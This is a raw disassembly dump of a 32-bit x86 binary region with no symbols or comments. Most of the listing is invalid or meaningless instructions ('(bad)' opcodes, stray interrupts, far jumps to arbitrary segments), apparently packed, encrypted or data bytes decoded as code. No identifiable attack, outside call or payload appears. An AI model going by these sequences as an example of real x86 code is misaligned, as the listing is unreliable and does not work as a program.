  425342:	cmp    edi,DWORD PTR [ebp+0x3b]
  425345:	loope  0x42531a
  425347:	jmp    0x4252db
  425349:	shl    ebp,cl
  42534b:	sub    BYTE PTR [ebx+0xc],dl
  42534e:	cmp    esp,ebx
  425350:	in     al,dx
  425351:	sub    al,0x3b
  425353:	lock shl edx,cl
  425356:	sub    BYTE PTR [ebx],bh
  425358:	icebp  
  425359:	shl    ebx,cl
  42535b:	xchg   edx,eax
  42535c:	push   ebx
  42535d:	jecxz  0x42532c
  42535f:	(bad)  
  425360:	std    
  425361:	int    0xa6
  425363:	std    
  425364:	cmp    edi,DWORD PTR [ebp+0x3b]
  425367:	loope  0x42533c
  425369:	jmp    0x4252fd
  42536b:	shl    ebp,cl
  42536d:	sub    BYTE PTR [ebx+0xc],dl
  425370:	aad    0xf3
  425372:	or     dl,BYTE PTR [esi-0x2723207]
  425378:	int    0x96
  42537a:	std    
  42537b:	cmp    edi,DWORD PTR [ebp+0x3b]
  42537e:	(bad)  
  425380:	jmp    0x425314
  425382:	shr    edx,cl
  425384:	sub    BYTE PTR [ebx+0x13],dl
  425387:	xchg   DWORD PTR [edx],eax
  425389:	int    0x8d
  42538b:	cmc    
  42538c:	int    0x96
  42538e:	cmc    
  42538f:	cmp    ebx,ecx
  425391:	cmp    edi,DWORD PTR [ebp-0x2d]
  425394:	jmp    0x1353:0x92ebd328
  42539b:	int    0x96
  42539d:	std    
  42539e:	int    0xa6
  4253a0:	std    
  4253a1:	cmp    esi,ecx
  4253a3:	cmp    esp,ecx
  4253a5:	shl    ebp,cl
  4253a7:	sub    bl,dl
  4253a9:	repz xchg edx,eax
  4253ab:	push   ebx
  4253ac:	aad    0x33
  4253ae:	adc    eax,DWORD PTR [ebx+0x2]
  4253b1:	das    
  4253b2:	pop    es
  4253b3:	pop    edx
  4253b4:	add    BYTE PTR [eax],al
  4253b6:	add    ch,cl
  4253b8:	jbe    0x4253b3
  4253ba:	int    0x8d
  4253bc:	mov    BYTE PTR [edx-0x327ef558],ch
  4253c2:	jbe    0x4253bd
  4253c4:	arpl   bx,cx
  4253c6:	rol    BYTE PTR [eax+eax*4+0x3bedcd96],cl
  4253cd:	ins    DWORD PTR es:[edi],dx
  4253ce:	pop    esi
  4253cf:	jbe    0x42541d
  4253d1:	aam    0x3a
  4253d3:	pop    esi
  4253d4:	jbe    0x42535e
  4253d6:	fdiv   DWORD PTR [edx]
  4253d8:	retf   0x8814
  4253db:	or     DWORD PTR [esi-0x69a6d0d1],edx
  4253e1:	das    
  4253e2:	adc    dh,bl
  4253e4:	in     eax,dx
  4253e5:	add    BYTE PTR [eax+0x2f960980],0xf1
  4253ec:	lea    ebp,[edi]
  4253ee:	retf   0x2f96
  4253f1:	or     DWORD PTR [eax+ecx*4],edx
  4253f4:	ins    BYTE PTR es:[edi],dx
  4253f5:	inc    ebx
  4253f6:	jbe    0x425380
  4253f8:	sub    BYTE PTR [ecx+0x7188d600],0xbd
  4253ff:	stc    
  425400:	std    
  425401:	add    BYTE PTR [eax],al
  425403:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425404:	ror    BYTE PTR [eax-0x12326980],cl
  42540a:	adc    ch,ch
  42540c:	cmp    al,0x84
  42540e:	add    BYTE PTR [eax+0x49bf985b],0x21
  425415:	xchg   BYTE PTR ds:0xc911a60a,dh
  42541b:	jbe    0x42541a
  42541d:	inc    ecx
  42541e:	and    DWORD PTR [esi-0x128936cb],eax
  425424:	dec    ecx
  425425:	sub    DWORD PTR [esi-0x4a8936cb],eax
  42542b:	jno    0x4253e3
  42542d:	cli    
  42542e:	arpl   bp,cx
  425430:	jbe    0x425443
  425432:	int    0x8d
  425434:	adc    DWORD PTR [edx+0x77cfffc0],ebx
  42543a:	sub    DWORD PTR [edx-0xfc486c5],0xd392bdd3
  425444:	repnz sub BYTE PTR [ebx-0x2d],dl
  425448:	or     dh,BYTE PTR [esi-0x7]
  42544b:	leave  
  42544c:	jbe    0x4253f3
  42544e:	into   
  42544f:	and    DWORD PTR [esi-0x628936cb],eax
  425455:	inc    esi
  425456:	sbb    DWORD PTR [ebp-0x528936de],esi
  42545c:	mov    BYTE PTR [eax-0x34327f80],al
  425462:	int    0x76
  425464:	std    
  425465:	int    0x8d
  425467:	std    
  425468:	cmp    esi,eax
  42546a:	shl    edx,cl
  42546c:	sub    BYTE PTR [ebx],bh
  42546e:	jns    0x425443
  425470:	mov    ebp,0xcdd35392
  425475:	lea    edx,[ecx]
  425477:	int    0x96
  425479:	adc    DWORD PTR [ebx],edi
  42547b:	(bad)  
  42547d:	(bad)  
  42547f:	jmp    0x425413
  425481:	shr    edx,cl
  425483:	sub    BYTE PTR [ebx+0x13],dl
  425486:	das    
  425487:	rcl    ebx,1
  425489:	in     al,dx
  42548a:	outs   dx,BYTE PTR ds:[esi]
  42548b:	int    0x76
  42548d:	cmc    
  42548e:	int    0x8d
  425490:	cmc    
  425491:	sar    DWORD PTR [ebp-0x6d0d2cd8],cl
  425497:	push   ebx
  425498:	sar    DWORD PTR [ebx],cl
  42549a:	lds    ecx,FWORD PTR [edx]
  42549c:	jbe    0x425497
  42549e:	iret   
  42549f:	jbe    0x42549a
  4254a1:	jo     0x425460
  4254a3:	mov    ecx,0xa0000fe
  4254a8:	jbe    0x4254a3
  4254aa:	int    0x76
  4254ac:	stc    
  4254ad:	int    0x8d
  4254af:	cmc    
  4254b0:	or     al,BYTE PTR ds:0xfc9dcf
  4254b6:	add    ch,cl
  4254b8:	jbe    0x4254b7
  4254ba:	int    0x8d
  4254bc:	std    
  4254bd:	cmp    edi,DWORD PTR [ecx+0x3b]
  4254c0:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4254c7:	push   ebx
  4254c8:	rol    DWORD PTR [edi+0x760af576],cl
  4254ce:	cmc    
  4254cf:	int    0x76
  4254d1:	in     eax,dx
  4254d2:	int    0x8d
  4254d4:	in     eax,dx
  4254d5:	cmp    esi,eax
  4254d7:	shl    edx,cl
  4254d9:	sub    BYTE PTR [ebx],bh
  4254db:	jns    0x4254b0
  4254dd:	mov    ebp,0xcdd35392
  4254e2:	(bad)  
  4254e3:	std    
  4254e4:	int    0x96
  4254e6:	std    
  4254e7:	cmp    ecx,DWORD PTR [edi]
  4254e9:	cmp    ebx,ecx
  4254eb:	shr    ebx,cl
  4254ed:	xchg   edx,eax
  4254ee:	shr    edx,cl
  4254f0:	sub    BYTE PTR [ebx+0x13],dl
  4254f3:	xor    edx,ebx
  4254f5:	int    0x8d
  4254f7:	cmc    
  4254f8:	inc    ebx
  4254f9:	jge    0x4254d3
  4254fb:	mov    bl,0xcd
  4254fd:	jbe    0x4254b4
  4254ff:	int    0x8d
  425501:	mov    ch,0x3b
  425503:	jns    0x425540
  425505:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  42550c:	push   ebx
  42550d:	ror    DWORD PTR [edx],cl
  42550f:	jbe    0x42550a
  425511:	leave  
  425512:	jbe    0x425501
  425514:	bound  ebx,QWORD PTR [edi]
  425516:	xchg   BYTE PTR ds:0x1ebddcd,dh
  42551c:	add    BYTE PTR [eax-0x5a723280],0xcd
  425523:	jbe    0x4254ca
  425525:	cmp    ecx,ecx
  425527:	shr    DWORD PTR [ebp-0x2cf0c4d8],cl
  42552d:	jmp    0x4254c1
  42552f:	push   ebx
  425530:	jge    0x4254ff
  425532:	jbe    0x42552d
  425534:	aad    0xbd
  425536:	or     dh,BYTE PTR [esi-0x63]
  425539:	int    0x76
  42553b:	mov    dl,cl
  42553d:	or     BYTE PTR [ecx],0x76
  425540:	in     al,dx
  425541:	retf   0xec76
  425544:	int    0x8d
  425546:	stc    
  425547:	das    
  425548:	pop    ecx
  425549:	ins    DWORD PTR es:[edi],dx
  42554a:	cmp    edx,ebx
  42554c:	or     dh,BYTE PTR [esi-0xb]
  42554f:	int    0x76
  425551:	in     eax,dx
  425552:	int    0x8d
  425554:	in     eax,dx
  425555:	cmp    edi,DWORD PTR [ecx-0x2d]
  425558:	mov    ebp,0xd3f03b92
  42555d:	repnz sub BYTE PTR [ebx-0x2d],dl
  425561:	int    0x8d
  425563:	cmc    
  425564:	sub    edx,ebx
  425566:	int    0x5
  425568:	push   es
  425569:	popf   
  42556a:	cld    
  42556b:	add    BYTE PTR [eax],al
  42556d:	int    0x8d
  42556f:	popf   
  425570:	cmp    edx,ebx
  425572:	or     dh,BYTE PTR [esi-0x7]
  425575:	int    0x76
  425577:	std    
  425578:	int    0x8d
  42557a:	std    
  42557b:	cmp    edi,DWORD PTR [ecx+0x3b]
  42557e:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  425585:	push   ebx
  425586:	rol    DWORD PTR [ecx+0x76cd8876],cl
  42558c:	std    
  42558d:	int    0x8d
  42558f:	std    
  425590:	cmp    edi,DWORD PTR [ecx+0x3b]
  425593:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  42559a:	push   ebx
  42559b:	sar    DWORD PTR [esi],cl
  42559d:	jbe    0x42554c
  42559f:	int    0x76
  4255a1:	adc    ebp,ecx
  4255a3:	lea    edx,[ecx]
  4255a5:	cmp    esi,eax
  4255a7:	cmp    edi,DWORD PTR [ecx-0x2d]
  4255aa:	repnz sub bl,dl
  4255ad:	mov    ebp,0xcdd35392
  4255b2:	lea    ebp,[ebp+0x62f7d43]
  4255b8:	imul   eax,DWORD PTR [eax],0x0
  4255bb:	add    ch,cl
  4255bd:	jbe    0x425574
  4255bf:	int    0x8d
  4255c1:	mov    ch,0x3b
  4255c3:	jns    0x425600
  4255c5:	lock shl edx,cl
  4255c8:	sub    bl,dl
  4255ca:	mov    ebp,0xd353aa92
  4255cf:	int    0x8d
  4255d1:	stc    
  4255d2:	test   al,0x3b
  4255d4:	shl    DWORD PTR [ebx-0x35],cl
  4255d7:	rol    BYTE PTR [eax+eax*4+0x4edcd96],cl
  4255de:	in     eax,dx
  4255df:	xor    BYTE PTR [ebx],bh
  4255e1:	retf   
  4255e2:	pop    ebx
  4255e3:	call   0xbb05:0x2f888d5e
  4255ea:	add    BYTE PTR [eax+0x2f024380],0x5
  4255f1:	rol    DWORD PTR [eax-0x44d07f80],1
  4255f7:	cwde   
  4255f8:	sub    al,0x5d
  4255fa:	lahf   
  4255fb:	xor    eax,0x8d0a8080
  425600:	std    
  425601:	or     cl,BYTE PTR [ebp+0xaf13b11]
  425607:	(bad)  
  425608:	stc    
  425609:	mov    eax,0xe3b813cd
  42560e:	retf   
  42560f:	cmp    eax,DWORD PTR [eax]
  425611:	leave  
  425612:	jbe    0x425609
  425614:	adc    al,0x80
  425616:	add    BYTE PTR [eax+0x77fa43b8],0xc4
  42561d:	mov    eax,0xb8fde6cd
  425622:	jecxz  0x4255ed
  425624:	mov    eax,0xbb2ff93b
  425629:	(bad)  
  42562a:	stc    
  42562b:	iret   
  42562c:	dec    esp
  42562d:	into   
  42562e:	mov    eax,0xd692de5e
  425633:	pop    edx
  425634:	das    
  425635:	mov    ebx,0xf58d0a89
  42563a:	mov    eax,0x4dd67d43
  42563f:	das    
  425640:	mov    ebx,0xa6cdfd8d
  425645:	mov    BYTE PTR [ecx],al
  425647:	fs push ds
  425649:	adc    ah,0x3b
  42564c:	das    
  42564d:	mov    ebx,0xa6cdfd8d
  425652:	mov    BYTE PTR [eax+0x1e4c692f],bh
  425658:	mov    eax,0x3bb8d3e3
  42565d:	jge    0x425617
  42565f:	pop    esi
  425660:	(bad)  
  425661:	cmc    
  425662:	aam    0x23
  425664:	leave  
  425665:	jbe    0x42565c
  425667:	sbb    BYTE PTR [eax+0x76008080],al
  42566d:	stc    
  42566e:	int    0x7d
  425670:	mov    eax,0xb82c8e3b
  425675:	jecxz  0x425642
  425677:	mov    eax,0x82f98d5e
  42567c:	inc    ecx
  42567d:	in     al,dx
  42567e:	dec    edx
  42567f:	add    BYTE PTR [esi+0x11],dh
  425682:	leave  
  425683:	jbe    0x42567a
  425685:	push   ss
  425686:	add    BYTE PTR [eax-0x1944d080],0xfd
  42568d:	int    0xa6
  42568f:	mov    BYTE PTR [ebx],bh
  425691:	retf   
  425692:	pop    esp
  425693:	dec    esp
  425694:	sub    dl,ah
  425696:	push   ss
  425697:	add    BYTE PTR [esi-0x3],dh
  42569a:	add    al,0xe6
  42569c:	cmc    
  42569d:	sbb    BYTE PTR [edi],ch
  42569f:	push   es
  4256a0:	jb     0x4256a2
  4256a2:	add    BYTE PTR [eax],al
  4256a4:	cmp    ebp,DWORD PTR [ebp-0x56]
  4256a7:	arpl   bx,cx
  4256a9:	rol    BYTE PTR [eax+eax*4-0x47ee7233],cl
  4256b0:	jecxz  0x425685
  4256b2:	mov    eax,0x6d3b7d3b
  4256b7:	mov    eax,0x2f2c8e43
  4256bc:	adc    eax,0x96b9ec6d
  4256c1:	int    0xed
  4256c3:	add    al,0xed
  4256c5:	mov    esp,0xc09a985b
  4256ca:	inc    esp
  4256cb:	add    dh,dl
  4256cd:	mov    ch,cl
  4256cf:	adc    DWORD PTR [ebp+0xf90b],edi
  4256d5:	iret   
  4256d6:	js     0x42570a
  4256d8:	or     dh,BYTE PTR [esi+0x25]
  4256db:	iret   
  4256dc:	js     0x425752
  4256de:	or     dh,BYTE PTR [esi+0x2d]
  4256e1:	iret   
  4256e2:	js     0x42569c
  4256e4:	or     dh,BYTE PTR [esi+0x35]
  4256e7:	iret   
  4256e8:	pop    es
  4256e9:	or     DWORD PTR [eax+0x760a8080],eax
  4256ef:	cmp    eax,0x804107cf
  4256f4:	add    BYTE PTR [eax-0x30ba89f6],0x7
  4256fb:	or     eax,0xa808080
  425700:	jbe    0x4256d2
  425702:	iret   
  425703:	pop    es
  425704:	out    dx,eax
  425705:	add    BYTE PTR [eax+0x55760a80],0xcf
  42570c:	pop    es
  42570d:	xor    BYTE PTR [ecx+0x760a8080],al
  425713:	pop    ebp
  425714:	iret   
  425715:	pop    es
  425716:	inc    edx
  425717:	add    DWORD PTR [eax+0x65760a80],0xcf1dd60a
  425721:	pop    es
  425722:	xchg   esp,eax
  425723:	add    DWORD PTR [eax+0x6d760a80],0x813d07cd
  42572d:	add    BYTE PTR [eax-0x25c4af33],0xa
  425734:	xchg   esi,eax
  425735:	icebp  
  425736:	or     dl,BYTE PTR [esi-0x6269f56b]
  42573c:	or     dl,BYTE PTR [esi+0x7d76c9a5]
  425742:	(bad)  
  425743:	mov    cl,0xde
  425745:	adc    ebx,DWORD PTR [ebp-0x43]
  425748:	or     ah,BYTE PTR [ebx]
  42574a:	and    eax,0xcd0d760a
  42574f:	lea    edi,[ebp-0x33]
  425752:	out    0xd,al
  425754:	cmp    edi,ecx
  425756:	adc    al,BYTE PTR [edx]
  425758:	jnp    0x425791
  42575a:	ficom  WORD PTR [ebx]
  42575c:	das    
  42575d:	inc    ebp
  42575e:	cli    
  42575f:	xchg   edx,eax
  425760:	rcl    DWORD PTR [eax],cl
  425762:	xchg   edx,eax
  425763:	or     ah,dh
  425765:	mov    ch,0xcd
  425767:	out    0x7d,al
  425769:	int    0xa6
  42576b:	or     eax,0x3be1cd
  425770:	cmp    eax,DWORD PTR [ebx]
  425772:	shl    ebp,cl
  425774:	sub    BYTE PTR [ebx-0x10],dl
  425777:	int    0xe6
  425779:	mov    ch,0x61
  42577b:	add    BYTE PTR [eax-0x1dc49380],0x53
  425782:	cld    
  425783:	push   ebx
  425784:	lock or dl,dh
  425787:	stc    
  425788:	das    
  425789:	add    eax,0x808080f2
  42578e:	adc    dh,BYTE PTR [esi-0xf]
  425791:	(bad)  
  425792:	mov    esp,0xeb5f8bbd
  425797:	or     ah,BYTE PTR [ebx]
  425799:	and    eax,0x12958d31
  42579e:	jbe    0x42573d
  4257a0:	(bad)  
  4257a1:	mov    esp,0x8d318790
  4257a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4257a7:	int    0x8d
  4257a9:	jge    0x425778
  4257ab:	(bad)  
  4257ac:	or     eax,0xcd7de6cd
  4257b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4257b2:	or     eax,0x212113b
  4257b7:	jnp    0x4257f0
  4257b9:	ficom  WORD PTR [ebx]
  4257bb:	das    
  4257bc:	inc    ebp
  4257bd:	add    dl,BYTE PTR [edx-0x2cd7162d]
  4257c3:	out    dx,eax
  4257c4:	xchg   edx,eax
  4257c5:	cmp    ebx,ebp
  4257c7:	cmp    eax,DWORD PTR [ebx]
  4257c9:	push   ebx
  4257ca:	or     al,0x53
  4257cc:	clc    
  4257cd:	add    al,0xd3
  4257cf:	add    BYTE PTR [ecx+ebx*4],al
  4257d2:	add    BYTE PTR [edx],cl
  4257d4:	lea    edi,[ebp+0xa]
  4257d7:	(bad)  
  4257d8:	or     eax,0x53f18dcd
  4257dd:	lea    edx,[ebp+0x761223d4]
  4257e3:	icebp  
  4257e4:	mov    edx,DWORD PTR [ebx]
  4257e6:	dec    edx
  4257e7:	stc    
  4257e8:	pop    edi
  4257e9:	sbb    al,bl
  4257eb:	mov    ch,0x6b
  4257ed:	xor    DWORD PTR [ebp-0x6289ed6b],ecx
  4257f3:	(bad)
  4257f6:	std    
  4257f7:	xor    DWORD PTR [ebp+0x121ceca5],ecx
  4257fd:	(bad)  
  4257fe:	icebp  
  4257ff:	(bad)  
  425800:	mov    esp,0x76897abd
  425805:	xchg   ebp,eax
  425806:	adc    dh,BYTE PTR [esi-0x6f433963]
  42580c:	add    al,0x12
  42580e:	mov    dh,0xa5
  425810:	jmp    0x42581c
  425812:	and    esp,DWORD PTR ds:0xcd7d8dcd
  425818:	lea    ecx,ds:0xcd7de6cd
  42581e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42581f:	or     eax,0x92fc352f
  425824:	shr    ebx,cl
  425826:	sub    BYTE PTR [ebx],bh
  425828:	not    DWORD PTR [ebx-0xc]
  42582b:	shr    ecx,cl
  42582d:	xchg   edx,eax
  42582e:	push   ebx
  42582f:	lock adc al,BYTE PTR [edx]
  425832:	(bad)  
  425833:	aaa    
  425834:	ficom  WORD PTR [ebx]
  425836:	or     cl,BYTE PTR [ebp+0xa113b7d]
  42583c:	(bad)  
  42583d:	or     eax,0xcd7d8dcd
  425842:	(bad)  
  425843:	or     eax,0xcd7de6cd
  425848:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425849:	or     eax,0x212113b
  42584e:	jnp    0x425887
  425850:	ficom  WORD PTR [ebx]
  425852:	das    
  425853:	inc    ebp
  425854:	add    dl,BYTE PTR [edx-0x2cd7162d]
  42585a:	out    dx,eax
  42585b:	xchg   edx,eax
  42585c:	cmp    ebx,ebp
  42585e:	cmp    eax,DWORD PTR [ebx]
  425860:	push   ebx
  425861:	or     al,0x53
  425863:	clc    
  425864:	push   ebx
  425865:	comiss xmm0,DWORD PTR [esi]
  425868:	xor    al,BYTE PTR [eax]
  42586a:	add    BYTE PTR [eax],al
  42586c:	int    0xd6
  42586e:	stc    
  42586f:	push   es
  425870:	imul   DWORD PTR [edi]
  425872:	add    eax,0x808080d1
  425877:	int    0x78
  425879:	fs int 0xe4
  42587c:	push   eax
  42587d:	fadd   QWORD PTR [edi+0x349acdff]
  425883:	int    0x6f
  425885:	and    al,0xcd
  425887:	jp     0x4258b5
  425889:	int    0xaa
  42588b:	sbb    al,0x87
  42588d:	cdq    
  42588e:	or     dl,BYTE PTR [esi+0x149acd0d]
  425894:	xchg   DWORD PTR [edi],ecx
  425896:	xchg   DWORD PTR [ecx+0xa],edi
  425899:	(bad)  
  42589a:	in     eax,dx
  42589b:	or     dh,BYTE PTR [esi-0x6b]
  42589e:	or     dl,BYTE PTR [esi+0x7bd543f5]
  4258a4:	xchg   DWORD PTR [edx],ecx
  4258a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4258a7:	cmc    
  4258a8:	cmp    ebx,edx
  4258aa:	or     dl,BYTE PTR [esi-0xa69a15b]
  4258b0:	fcom   st(4)
  4258b2:	in     al,dx
  4258b3:	xchg   ebp,ecx
  4258b5:	jbe    0x42584c
  4258b7:	int    0xa6
  4258b9:	or     eax,0x5b24bb2f
  4258be:	inc    ebx
  4258bf:	call   0x14aa:0x436b771c
  4258c6:	ja     0x425870
  4258c8:	int    0x84
  4258ca:	mov    al,0xcd
  4258cc:	xchg   esi,eax
  4258cd:	mov    ch,cl
  4258cf:	and    al,0x1f
  4258d1:	or     dl,BYTE PTR [esi-0x30867803]
  4258d7:	xchg   esi,eax
  4258d8:	sbb    eax,0x9633a987
  4258dd:	mov    BYTE PTR [edx],cl
  4258df:	jbe    0x4258f2
  4258e1:	or     dl,BYTE PTR [esi-0x4a89368b]
  4258e7:	push   ebx
  4258e8:	add    BYTE PTR [eax-0x2693280],0x4
  4258ef:	pusha  
  4258f0:	adc    dh,0x28
  4258f3:	jo     0x4258c2
  4258f5:	jbe    0x42596c
  4258f7:	int    0x54
  4258f9:	xor    BYTE PTR [ebp+0xfddd],bh
  4258ff:	int    0xd6
  425901:	stc    
  425902:	int    0x8d
  425904:	in     eax,dx
  425905:	push   es
  425906:	ins    DWORD PTR es:[edi],dx
  425907:	aam    0x85
  425909:	int    0x76
  42590b:	std    
  42590c:	or     bl,BYTE PTR [ecx*8+0x76041176]
  425913:	std    
  425914:	test   BYTE PTR [eax],al
  425916:	lea    esi,[ebp-0x69321c2a]
  42591c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42591d:	push   edx
  42591e:	or     dl,BYTE PTR [esi-0xa69bc5b]
  425924:	or     dh,0xaa
  425927:	int    0x79
  425929:	test   al,0x63
  42592b:	retf   
  42592c:	rol    BYTE PTR [eax+eax*4-0x6712326a],cl
  425933:	int    0xd6
  425935:	mov    BYTE PTR [eax],al
  425937:	pop    ecx
  425938:	adc    DWORD PTR [ecx+0x76cd8080],eax
  42593e:	mov    BYTE PTR [ebp+0xfee4],bh
  425944:	int    0x7
  425946:	cmp    eax,0x3b808081
  42594b:	retf   
  42594c:	pop    esi
  42594d:	mov    BYTE PTR [eax-0x322ce8d1],ch
  425953:	shl    DWORD PTR [esi-0x327f7b2e],cl
  425959:	fwait
  42595a:	sbb    eax,0x5b808081
  42595f:	cwde   
  425960:	int    0x11
  425962:	pop    ebp
  425963:	lahf   
  425964:	xor    eax,0x4eec8080
  425969:	cmp    edi,DWORD PTR [ebp-0x48]
  42596c:	jecxz  0x425939
  42596e:	mov    eax,0xd2044a0a
  425973:	xchg   edx,eax
  425974:	add    al,0x79
  425976:	xchg   edx,eax
  425977:	das    
  425978:	mov    ebx,0x7d43b84e
  42597d:	(bad)  
  42597e:	repz cmp ebp,DWORD PTR [ebp-0x58]
  425982:	mov    eax,0x8cd920a
  425987:	sbb    eax,0x63808081
  42598c:	lds    ebx,FWORD PTR [edx+0x7cdf9cd]
  425992:	sbb    eax,0xd3808081
  425997:	jmp    0xed0be122
  42599c:	dec    edx
  42599d:	add    DWORD PTR [edx],eax
  42599f:	add    DWORD PTR [ecx],0xffffffeb
  4259a2:	mov    esi,0x526c8809
  4259a7:	retf   0x14a
  4259aa:	cli    
  4259ab:	sbb    dh,dl
  4259ad:	adc    BYTE PTR [ecx-0x80],bh
  4259b0:	or     ch,0x7
  4259b3:	sbb    eax,0x87808081
  4259b8:	leave  
  4259b9:	stos   BYTE PTR es:[edi],al
  4259ba:	lds    edx,FWORD PTR [esi-0x12ed1233]
  4259c0:	mov    al,0x80
  4259c2:	add    BYTE PTR [eax+0xabd5f5b],0x23
  4259c9:	and    eax,0x76c99a98
  4259ce:	cmc    
  4259cf:	xchg   ecx,eax
  4259d0:	aaa    
  4259d1:	ficom  WORD PTR [ebx]
  4259d3:	or     cl,BYTE PTR [ebp-0x12893607]
  4259d9:	(bad)  
  4259da:	aaa    
  4259db:	ficom  WORD PTR [ebx]
  4259dd:	or     cl,BYTE PTR [ebp-0x3692c4ef]
  4259e3:	jbe    0x4259a2
  4259e5:	dec    ecx
  4259e6:	and    DWORD PTR [esi-0x28936cb],eax
  4259ec:	inc    ecx
  4259ed:	and    DWORD PTR [esi-0xe8936cb],eax
  4259f3:	out    0x37,al
  4259f5:	ficom  WORD PTR [ebx]
  4259f7:	or     cl,BYTE PTR [ebp+0x5d76c995]
  4259fd:	fidiv  WORD PTR [edi]
  4259ff:	ficom  WORD PTR [ebx]
  425a01:	or     cl,BYTE PTR [ebp-0x1289329b]
  425a07:	int    0x96
  425a09:	adc    DWORD PTR [edi],ebp
  425a0b:	inc    ebp
  425a0c:	icebp  
  425a0d:	xchg   edx,eax
  425a0e:	shl    ebx,cl
  425a10:	xchg   edx,eax
  425a11:	int    0x96
  425a13:	in     eax,dx
  425a14:	int    0xd6
  425a16:	adc    ebx,edx
  425a18:	jmp    0x4229:0xbea6c328
  425a1f:	cmp    ecx,ecx
  425a21:	cmp    esi,edi
  425a23:	push   ebx
  425a24:	jns    0x425a30
  425a26:	jbe    0x4259cd
  425a28:	iret   
  425a29:	jbe    0x4259d8
  425a2b:	or     dh,BYTE PTR [esi+0xd]
  425a2e:	int    0x76
  425a30:	or     eax,0x8621d169
  425a35:	xor    eax,0x37b680c9
  425a3a:	ficom  WORD PTR [ebx]
  425a3c:	or     bh,BYTE PTR [esp+eax*4-0x33]
  425a40:	(bad)  
  425a41:	std    
  425a42:	int    0x96
  425a44:	std    
  425a45:	cmp    ecx,DWORD PTR [edi]
  425a47:	shr    ebx,cl
  425a49:	xchg   edx,eax
  425a4a:	sar    bh,0x9c
  425a4d:	cmp    esi,ecx
  425a4f:	shr    edx,cl
  425a51:	sub    BYTE PTR [ebx+0x13],dl
  425a54:	int    0x96
  425a56:	std    
  425a57:	int    0xa6
  425a59:	std    
  425a5a:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  425a60:	popf   
  425a61:	shl    ebp,cl
  425a63:	sub    BYTE PTR [ebx-0x2b],dl
  425a66:	xchg   DWORD PTR [ebx],edx
  425a68:	int    0x96
  425a6a:	std    
  425a6b:	int    0xa6
  425a6d:	std    
  425a6e:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  425a74:	popf   
  425a75:	shl    ebp,cl
  425a77:	sub    BYTE PTR [ebx-0x2b],dl
  425a7a:	xchg   DWORD PTR [ebx],edx
  425a7c:	int    0x96
  425a7e:	std    
  425a7f:	int    0xa6
  425a81:	std    
  425a82:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  425a88:	popf   
  425a89:	shl    ebp,cl
  425a8b:	sub    BYTE PTR [ebx-0x2b],dl
  425a8e:	xchg   DWORD PTR [ebx],edx
  425a90:	or     cl,bh
  425a92:	nop
  425a93:	add    BYTE PTR [eax],al
  425a95:	add    ch,cl
  425a97:	lea    edi,[ebp+0x3bbd96cd]
  425a9d:	icebp  
  425a9e:	cmp    ecx,DWORD PTR [edi]
  425aa0:	shr    edx,cl
  425aa2:	sub    bl,dl
  425aa4:	jmp    0x425a38
  425aa6:	push   ebx
  425aa7:	adc    ecx,ebp
  425aa9:	xchg   esi,eax
  425aaa:	mov    ebp,0x3bbda6cd
  425aaf:	cdq    
  425ab0:	cmp    ebx,DWORD PTR [ebp-0x2c6d0c2d]
  425ab6:	in     eax,0x28
  425ab8:	push   ebx
  425ab9:	aad    0xa
  425abb:	int3   
  425abc:	pop    ss
  425abd:	aam    0x0
  425abf:	add    BYTE PTR [eax],al
  425ac1:	int    0x8d
  425ac3:	dec    esp
  425ac4:	int    0x89
  425ac6:	int    0x96
  425ac8:	std    
  425ac9:	int    0xa6
  425acb:	std    
  425acc:	int    0x7e
  425ace:	jo     0x425b0b
  425ad0:	popf   
  425ad1:	cmp    ebx,DWORD PTR [ecx-0x2c6d0c2d]
  425ad7:	in     eax,0x28
  425ad9:	push   ebx
  425ada:	aad    0xa
  425adc:	int3   
  425add:	pop    ss
  425ade:	aam    0x0
  425ae0:	add    BYTE PTR [eax],al
  425ae2:	int    0x8d
  425ae4:	xor    ch,cl
  425ae6:	xchg   esi,eax
  425ae7:	xor    BYTE PTR [ebx],bh
  425ae9:	icebp  
  425aea:	cmp    ecx,DWORD PTR [edi]
  425aec:	shr    edx,cl
  425aee:	sub    bl,dl
  425af0:	jmp    0x425a84
  425af2:	push   ebx
  425af3:	adc    ecx,ebp
  425af5:	xchg   esi,eax
  425af6:	std    
  425af7:	int    0xa6
  425af9:	std    
  425afa:	cmp    ebx,DWORD PTR [ebp+0x3bfd76cd]
  425b00:	cdq    
  425b01:	shl    ebx,cl
  425b03:	xchg   edx,eax
  425b04:	shl    ebp,cl
  425b06:	sub    BYTE PTR [ebx-0x2b],dl
  425b09:	int    0xa6
  425b0b:	std    
  425b0c:	cmp    edi,DWORD PTR [ecx-0x2d]
  425b0f:	mov    ebp,0xfff40492
  425b14:	shl    ebp,cl
  425b16:	sub    BYTE PTR [ebx-0x3b],dl
  425b19:	xchg   ecx,esi
  425b1b:	int    0x76
  425b1d:	adc    al,0xa
  425b1f:	int3   
  425b20:	pop    ss
  425b21:	aam    0x0
  425b23:	add    BYTE PTR [eax],al
  425b25:	int    0x8d
  425b27:	adc    al,0x4
  425b29:	add    bh,bh
  425b2b:	shl    edx,cl
  425b2d:	sub    BYTE PTR [ebx],bh
  425b2f:	jns    0x425b04
  425b31:	mov    ebp,0xcdd35392
  425b36:	(bad)  
  425b37:	std    
  425b38:	int    0x96
  425b3a:	std    
  425b3b:	add    al,0xfb
  425b3d:	(bad)  
  425b3e:	cmp    ecx,DWORD PTR [edi]
  425b40:	shr    edx,cl
  425b42:	sub    bl,dl
  425b44:	jmp    0x425ad8
  425b46:	push   ebx
  425b47:	adc    ecx,ebp
  425b49:	xchg   esi,eax
  425b4a:	std    
  425b4b:	int    0xa6
  425b4d:	std    
  425b4e:	cmp    ebx,DWORD PTR [ecx-0x2c000bfc]
  425b54:	repz xchg edx,eax
